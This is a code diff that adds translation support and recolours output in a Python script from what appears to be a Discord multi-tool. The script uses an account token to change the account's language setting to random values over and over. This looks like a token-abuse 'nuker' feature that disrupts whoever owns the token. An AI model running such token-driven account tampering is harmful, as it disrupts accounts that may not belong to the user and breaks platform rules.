@@ -1,5 +1,12 @@
 from Config.Util import *
 from Config.Config import *
+from Config.Translates import *
+
+current_language = LANGUAGE
+
+def tr(key):
+    return translations[current_language].get(key, key)
+
 try:
     import requests
     import time
@@ -17,7 +24,7 @@ try:
     r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
     if r.status_code == 200:
         try:
-            amount = int(input(f"{color.RED}{INPUT} Enter the number of cycles -> {color.RESET}"))
+            amount = int(input(f"{primary}{INPUT} {tr('CycleNumber')} -> {color.RESET}"))
         except:
             ErrorNumber()
 
@@ -27,10 +34,10 @@ try:
                 random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                 setting = {'locale': random_language}
                 requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
-                print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ADD} Status: {color.WHITE}Changed{color.RED} | Language: {color.WHITE}{random_language}{color.RED}")
+                print(f"{primary}[{secondary}{current_time_hour()}{invalid}] {ADD} Status: {color.WHITE}{tr('Changed')}{primary} | Language: {color.WHITE}{random_language}{primary}")
             except:
-                print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status:  {color.WHITE}Error{color.RED}  | Language: {color.WHITE}{random_language}{color.RED}")
-        print(f"\n{color.RED}{INFO} Finish.")
+                print(f"{primary}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status:  {color.WHITE}{tr('Error')}{primary}  | Language: {color.WHITE}{random_language}{primary}")
+        print(f"\n{primary}{INFO} Finish.")
         Continue()
         Reset()
     else:
